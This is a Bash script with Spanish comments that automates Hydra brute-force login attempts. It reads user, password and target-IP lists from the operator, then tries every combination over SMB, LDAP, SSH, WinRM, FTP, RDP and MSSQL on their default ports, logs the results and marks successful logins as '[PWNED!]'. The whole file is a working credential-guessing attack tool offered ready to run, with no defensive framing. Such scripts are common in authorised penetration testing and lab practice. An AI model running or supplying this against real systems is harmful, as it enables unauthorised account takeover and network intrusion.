#!/bin/bash

# Solicitar archivos con rutas absolutas o relativas
read -p "Ingrese el archivo de usuarios (ruta absoluta o relativa): " USERS_FILE
read -p "Ingrese el archivo de contraseñas (ruta absoluta o relativa): " PASSWORDS_FILE
read -p "Ingrese el archivo de IPs objetivo (ruta absoluta o relativa): " HOSTS_FILE
OUTPUT_FILE="resultados_hydra.txt"

# Convertir rutas relativas a absolutas
USERS_FILE=$(realpath "$USERS_FILE")
PASSWORDS_FILE=$(realpath "$PASSWORDS_FILE")
HOSTS_FILE=$(realpath "$HOSTS_FILE")

# Verificar que los archivos existen
if [[ ! -f "$USERS_FILE" || ! -f "$PASSWORDS_FILE" || ! -f "$HOSTS_FILE" ]]; then
    echo "Uno o más archivos no existen. Verifique las rutas."
    exit 1
fi

# Limpiar archivo de salida
echo "===== Resultados de Enumeración con Hydra =====" > "$OUTPUT_FILE"

# Protocolos a evaluar con sus respectivos puertos
declare -A PROTOCOL_PORTS
PROTOCOL_PORTS=( ["smb"]=445 ["ldap"]=389 ["ssh"]=22 ["winrm"]=5985 ["ftp"]=21 ["rdp"]=3389 ["mssql"]=1433 )

# Bucle para recorrer cada protocolo
for PROTOCOL in "${!PROTOCOL_PORTS[@]}"; do
    echo -e "\n============================" | tee -a "$OUTPUT_FILE"
    echo "[*] Enumerando $PROTOCOL con Hydra" | tee -a "$OUTPUT_FILE"
    echo "============================" | tee -a "$OUTPUT_FILE"

    PORT=${PROTOCOL_PORTS[$PROTOCOL]}

    # Ejecutar Hydra
    HYDRA_OUTPUT=$(hydra -L "$USERS_FILE" -P "$PASSWORDS_FILE" -M "$HOSTS_FILE" "$PROTOCOL" -s "$PORT" -V 2>&1)

    # Verificar si hay resultados antes de escribir en el archivo
    if [[ -z "$HYDRA_OUTPUT" ]]; then
        echo "[-] No se encontraron respuestas para $PROTOCOL" | tee -a "$OUTPUT_FILE"
    else
        echo "$HYDRA_OUTPUT" | tee -a "$OUTPUT_FILE"

        # Si hay credenciales válidas, marcar como [PWNED!]
        if echo "$HYDRA_OUTPUT" | grep -iq "password: "; then
            echo "[PWNED!] Credenciales válidas encontradas en $PROTOCOL" | tee -a "$OUTPUT_FILE"
        fi
    fi
done

echo -e "\n===== Escaneo finalizado. Resultados guardados en $OUTPUT_FILE ====="
